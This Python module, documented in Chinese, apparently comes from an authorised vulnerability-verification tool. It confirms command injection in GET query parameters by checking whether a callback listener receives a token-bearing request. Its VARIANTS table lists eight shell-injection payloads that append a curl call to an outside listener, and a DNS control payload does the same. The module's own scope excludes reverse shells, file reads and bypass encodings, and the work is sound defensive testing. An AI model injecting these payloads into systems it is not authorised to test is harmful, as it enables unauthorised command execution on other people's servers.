"""verify-cmdi 判定器（M18-a）：命令注入的唯一确认手段 = **回调收到请求**。

## 为什么是「回调收到请求」而不是别的

命令注入与 sqli/xss/idor 的判定形态不同：它的**答案不在目标给我们的响应里**。
注入 `;curl http://<我们的 listener>/c/<token>` 之后，命令到底执没执行，唯一
可信的观测是**我们自己起的 listener 收到了那次请求**——这是二值事实，没有
「像不像」的余地（与 verify-ssrf 同一立场，见 `verify/ssrf.py`）。

**响应体里的任何东西都不作证据**：回显出来的 `curl ...` 只是文本反射，
状态码与耗时也不是证据。

## 复用什么、新写什么

复用的（**一行不改**，直接从 `verify/ssrf.py` 导入）：

- :class:`~proofhound.verify.ssrf.CallbackListener` —— 宿主进程内 listener，
  含每探针唯一 token 登记、常量时间比对、未登记 token 记 ``ignored`` 不计命中、
  每 token 命中上限、记录上限；
- :func:`~proofhound.verify.ssrf.new_token`（128 位）与 :func:`fetch`（不跟随重定向）；
- :func:`~proofhound.verify.ssrf.token_delivered`（交付证明的正文搜索）；
- 回连地址三件套 :func:`resolve_callback_host` / :func:`resolve_callback_bind` /
  :func:`resolve_callback_port` 与逃逸阀——**连限制 49 踩过的两个坑一并继承**
  （`host.docker.internal` 在 dockerd 上不解析；告知地址与绑定地址混用会导致
  listener `gaierror` 绑不上）。

新写的只有：**载荷变体表**、**交付证明的判定方式**、**DNS 非命中变体**（本模块相对
SSRF 的净新增防伪件，理由见下）。

## 三道防线

1. **每探针唯一 token + 常量时间比对**：token 只出现在**我们注入的**载荷里
   ⇒ 第三方无法伪造命中；路径不含 token 的请求一律忽略。
2. **交付证明（delivery proof）**：先注入**纯 token**（不含任何命令）看目标是否
   原样回显。回显 ⇒ 该参数确实把值带进了被拼接的命令串，载荷「送达」有据。
   **不成立即 blocked**——绝不把「载荷根本没送到」误判成「送到了但没执行」
   （那是假阴性，会污染真阴性结论）。
3. **DNS 非命中变体**（本模块**净新增**）：注入
   ``;curl http://<随机 nonce 主机名>.invalid/c/<token>``。该主机名**解析不了**，
   真 shell 因此**不会**产生我们能收到的请求；而若目标前面挂着 WAF / 反向代理 /
   截图服务在**替我们抓取 URL**，它也解析不了同一名字。
   故这一变体**单独不确认任何东西**，它的作用是**排除第三方代抓取**：
   **若它反而命中了，说明命中来自别的东西 ⇒ 整批判 blocked**。

   > 这是本类型相对 SSRF 的**净新增攻击面**（SSRF 的载荷指向的就是我们自己，
   > 不存在第三方代抓取的混淆），必须显式防。详见裁定文档 §2.2。

## 判定分界（宁漏勿滥）

- 命中 token **且**交付证明成立 **且** DNS 非命中变体未命中 → **confirmed**；
- 探针出错 / DNS 非命中变体命中 / 交付证明不成立 → **blocked**（覆盖不全，不驳回）；
- 干净未命中 + 交付证明成立 → **rejected**（真阴性）。

## 这个模块明确不做什么（裁定边界，见 RULING_M18_CMDI.md）

- **不做时间盲注**（`sleep`）——耗时不是二值事实，且与铁律 2 的「行为类证据」取向
  无关（本模块只认带外回调）；
- **不做回显型确认**（从响应里读命令输出）——响应内容不作证据；
- **不做反弹 shell、不写目标状态、不读文件内容、不外泄命令输出**——载荷只发起
  一次出站 HTTP 请求，其余一概不做（也因此 `skills/profiles.py` 里本 skill 记为
  **只读验证**：`mutating=False`）；
- **只覆盖 GET query 参数**——POST/表单、header、JSON body 不在本轮范围；
- **不做编码/绕过变体**（空格替代、`$IFS`、base64 混淆等）——那是绕过技巧，
  不是确认所需，且会扩大攻击面（与限制 51 对 SSRF 的同一条理由）。
"""

from __future__ import annotations

import urllib.parse
from dataclasses import dataclass, field

from proofhound.verify.prefilter import with_query_param
from proofhound.verify.ssrf import (
    BANNER,
    DELIVERY_PROOF_CHARS,
    CallbackListener,
    ProbeResponse,
    fetch,
    new_token,
    token_delivered,
)

#: 确认手段的 method 白名单值。与既有五类**互不染指**——`tests/test_ssrf.py`
#: 会对整个 `GATE_MATRIX` 逐条断言 method 名不重复。
CMDI_CONFIRMED_METHOD = "cmdi-callback-confirmed"

#: token 前缀（与 SSRF 的 ``phssrf_`` 区分，便于日志/审计里分辨来源）。
CMDI_TOKEN_PREFIX = "phcmdi_"

#: 探针变体 → 载荷模板。``{cb}`` 是回调地址占位符，``{nonce_url}`` 是 DNS
#: 非命中地址占位符。**裁定上限 ≤8 条**，此处正好 8 条（含 DNS 变体）。
#:
#: 选用理由：覆盖 POSIX shell 最常见的命令分隔/拼接手段。刻意**不含**
#: 编码绕过与空白替代（见模块 docstring）。
VARIANTS: tuple[tuple[str, str], ...] = (
    ("semicolon", ";curl {cb}"),
    ("pipe", "|curl {cb}"),
    ("and", "&&curl {cb}"),
    ("or", "||curl {cb}"),
    ("subshell", "$(curl {cb})"),
    ("backtick", "`curl {cb}`"),
    ("newline", "\ncurl {cb}"),
    ("quoted-subshell", "\"$(curl {cb})\""),
)

#: DNS 非命中变体的名字（它**不参与确认**，只用于排除第三方代抓取）。
DNS_VARIANT = "dns-nonresolving"

#: 交付证明探针的名字（注入纯 token，不含任何命令）。
DELIVERY_VARIANT = "delivery-proof-plain"

#: 不可解析的顶级域（RFC 6761 保留，保证解析必然失败）。
NONRESOLVING_TLD = ".invalid"


def new_cmdi_token() -> str:
    """生成一个本类型专属前缀的探针 token（128 位随机）。"""
    return CMDI_TOKEN_PREFIX + new_token().removeprefix("phssrf_")


def delivery_probe_value(token: str) -> str:
    """交付证明探针的**注入值**：纯 token，不含任何命令分隔符。

    为什么纯 token 就够：若目标把该参数值拼进了最终执行的命令串，那么**不注入
    任何分隔符**时它是否回显，就精确回答了「值有没有送到那个拼接点上」。
    带分隔符的变体注入后回显与否会被执行结果扰动，反而不干净。
    """
    return token


def dns_probe_value(nonce_host: str, port: int, token: str) -> tuple[str, str]:
    """DNS 非命中变体：返回 ``(注入值, 该变体本应命中的地址)``。

    地址的宿主是**不可解析**的随机名 ⇒ 真 shell 与"替我们抓取的中间件"**都**
    不会产生我们能收到的请求。故它命中即意味着有别的东西在代抓取。
    """
    host = nonce_host if nonce_host.endswith(NONRESOLVING_TLD) else (
        nonce_host + NONRESOLVING_TLD
    )
    url = f"http://{host}:{port}/{token}"
    return f";curl {url}", url


def callback_value(variant_template: str, callback_url: str) -> str:
    """把变体模板渲染成注入值。"""
    return variant_template.format(cb=callback_url)


def build_probe_url(asset: str, param: str, value: str) -> str:
    """把 ``asset`` 的 ``param`` 替换成 ``value``（复用既有确定性重编码）。"""
    return with_query_param(asset, param, value)


def same_origin(url: str, other: str) -> bool:
    """两 URL 是否完全同源（scheme/host/port）——载荷探测的同源自检用。

    与 SSRF 的同源自检同一目的：载荷 URL 必须仍指向**已授权资产**本身，
    绝不因为我们拼了载荷就指到别处去（红线 5）。
    """
    return _origin(url) == _origin(other)


def _origin(url: str) -> tuple[str, str, int] | None:
    parsed = urllib.parse.urlparse(url)
    if not parsed.scheme or not parsed.hostname:
        return None
    try:
        port = parsed.port
    except ValueError:
        return None
    if port is None:
        port = 443 if parsed.scheme == "https" else 80
    return parsed.scheme.lower(), parsed.hostname.lower(), port


@dataclass
class CmdiJudgment:
    """命令注入判定结论（全部依据结构化，供判定 JSON 落盘与 Verifier 摘要）。"""

    verdict: str  # confirmed / rejected / blocked
    reasons: list[str] = field(default_factory=list)
    #: 命中的探针变体（confirmed 时非空）
    hit_variant: str = ""
    hit_requests: list[dict] = field(default_factory=list)
    #: 交付证明是否成立（纯 token 探针被目标原样回显）
    delivered: bool = False
    #: DNS 非命中变体是否命中（命中 = 有第三方在代抓取 ⇒ 阻断确认）
    dns_misfire: bool = False
    probes: list[dict] = field(default_factory=list)
    ignored_requests: list[dict] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "verdict": self.verdict,
            "reasons": list(self.reasons),
            "hit_variant": self.hit_variant,
            "hit_requests": list(self.hit_requests),
            "delivered": self.delivered,
            "dns_misfire": self.dns_misfire,
            "probes": list(self.probes),
            "ignored_requests": list(self.ignored_requests),
        }


def judge(
    *,
    callback_hit: bool,
    hit_requests: list[dict] | None = None,
    hit_variant: str = "",
    delivered: bool = False,
    dns_misfire: bool = False,
    probes: list[dict] | None = None,
    probes_errored: bool = False,
    ignored: list[dict] | None = None,
) -> CmdiJudgment:
    """纯判定函数：把探针结果映射成 confirmed / rejected / blocked。

    判定表（**宁漏勿滥**；顺序即优先级）：

    ====================================================  ==========
    条件                                                   结论
    ====================================================  ==========
    命中 token ∧ 交付证明成立 ∧ DNS 非命中变体未命中        confirmed
    探针出错                                                blocked
    DNS 非命中变体命中（第三方在代抓取）                    blocked
    交付证明不成立（载荷送达无据）                          blocked
    干净未命中 + 交付证明成立                               rejected
    ====================================================  ==========

    ``delivered`` 是 confirmed 与 rejected **共同**的前置：没有它，两种结论都
    不可靠（confirmed 可能是别的东西在抓取、rejected 可能是载荷根本没送到）。
    """
    probes = list(probes or [])
    ignored = list(ignored or [])

    # 1) 出错 → 覆盖不全，最高优先级阻断（不驳回）
    if probes_errored:
        return CmdiJudgment(
            verdict="blocked",
            reasons=["探针存在错误（覆盖不全，不驳回）"],
            delivered=delivered,
            dns_misfire=dns_misfire,
            probes=probes,
            ignored_requests=ignored,
        )

    # 2) DNS 非命中变体命中 ⇒ 有别的东西在替我们抓取 ⇒ 本次观测不可信
    if dns_misfire:
        return CmdiJudgment(
            verdict="blocked",
            reasons=[
                "DNS 非命中变体（不可解析主机名）竟然命中 ⇒ 命中来自第三方"
                "代抓取（WAF/反向代理/截图服务），不能归因于命令执行；"
                "本次观测整体不可信（覆盖不全，不驳回）"
            ],
            delivered=delivered,
            dns_misfire=True,
            probes=probes,
            ignored_requests=ignored,
        )

    # 3) 交付证明不成立 ⇒ 载荷送达无据，两种结论都不可靠
    if not delivered:
        return CmdiJudgment(
            verdict="blocked",
            reasons=[
                "交付证明不成立：注入纯 token 后目标响应里找不到它，"
                "无法确认该参数值被带进了被执行的命令串（覆盖不全，不驳回）"
            ],
            probes=probes,
            ignored_requests=ignored,
        )

    # 4) 命中 ⇒ 确认（二值事实）
    if callback_hit:
        return CmdiJudgment(
            verdict="confirmed",
            reasons=[
                "回调 listener 收到含本次探针 token 的请求（二值事实：命令被执行了）",
                f"命中探针：{hit_variant or '(未标注)'}",
                "交付证明成立（纯 token 探针被目标原样回显）",
            ],
            hit_variant=hit_variant,
            hit_requests=list(hit_requests),
            delivered=True,
            probes=probes,
            ignored_requests=ignored,
        )

    # 5) 干净未命中 + 送达有据 ⇒ 真阴性
    return CmdiJudgment(
        verdict="rejected",
        reasons=[
            "探针干净完成、载荷已送达（交付证明成立），但回调 listener 未收到任何"
            "请求 ⇒ 该参数不是命令注入入口",
            "判定依据：没有带外请求；响应体回显、状态码、耗时一律不作证据",
        ],
        delivered=True,
        probes=probes,
        ignored_requests=ignored,
    )


def summary_for_verifier(j: CmdiJudgment, *, callback_host_port: str) -> dict:
    """确定性结论块（送 Verifier 的 ``extra_summary``；红线 3）。

    只含枚举/计数/字段名/锚点——**回调请求原文与响应体一行不进 prompt**。
    """
    return {
        "cmdi_verdict": j.verdict,
        "callback_listener": callback_host_port,
        "callback_hit": bool(j.hit_requests),
        "callback_hit_count": len(j.hit_requests),
        "callback_hit_sources": sorted(
            {r.get("source_ip", "") for r in j.hit_requests if r.get("source_ip")}
        ),
        "delivery_proof_ok": j.delivered,
        "dns_control_misfire": j.dns_misfire,
        "probe_count": len(j.probes),
        "ignored_request_count": len(j.ignored_requests),
        "hit_variant": j.hit_variant,
    }


__all__ = [
    "BANNER",
    "CMDI_CONFIRMED_METHOD",
    "CMDI_TOKEN_PREFIX",
    "DELIVERY_PROOF_CHARS",
    "DELIVERY_VARIANT",
    "DNS_VARIANT",
    "NONRESOLVING_TLD",
    "VARIANTS",
    "CallbackListener",
    "CmdiJudgment",
    "ProbeResponse",
    "build_probe_url",
    "callback_value",
    "delivery_probe_value",
    "dns_probe_value",
    "fetch",
    "judge",
    "new_cmdi_token",
    "same_origin",
    "summary_for_verifier",
    "token_delivered",
    "with_query_param",
]
